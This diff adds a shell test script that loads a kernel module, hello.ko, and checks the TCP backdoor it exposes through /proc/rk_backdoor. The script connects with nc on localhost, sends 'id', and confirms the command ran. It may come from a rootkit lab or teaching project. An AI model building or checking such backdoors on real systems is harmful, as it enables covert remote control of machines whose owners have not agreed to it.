@@ -1,0 +1,47 @@
+#!/bin/sh
+. /lib/check.sh
+
+begin "44-tcp-backdoor"
+
+ifconfig lo 127.0.0.1 up 2>/dev/null
+
+load hello.ko
+assert_loaded hello
+assert_exists /proc/rk_backdoor
+
+# Extract backdoor port
+port=$(cat /proc/rk_backdoor | sed -n 's/^port=\([0-9]*\)$/\1/p')
+if [ "$port" -gt 1024 ] 2>/dev/null; then
+    _ok "backdoor on port $port"
+else
+    _fail "expected high port, got '$port'"
+fi
+
+# Commands should start at 0
+assert_contains /proc/rk_backdoor "commands=0"
+
+sleep 1
+
+# Connect to backdoor, send a command, read output
+result=$(printf 'id\nexit\n' | nc -w 2 127.0.0.1 "$port" 2>/dev/null)
+case "$result" in
+    *uid=*)
+        _ok "command executed: $(echo "$result" | grep uid | head -1)"
+        ;;
+    *)
+        _fail "no command output: '$result'"
+        ;;
+esac
+
+# Command counter should have incremented
+cmds=$(cat /proc/rk_backdoor | sed -n 's/^commands=//p')
+if [ "$cmds" -gt 0 ] 2>/dev/null; then
+    _ok "command counter = $cmds"
+else
+    _fail "command counter not incremented ($cmds)"
+fi
+
+unload hello
+assert_absent /proc/rk_backdoor
+
+summary
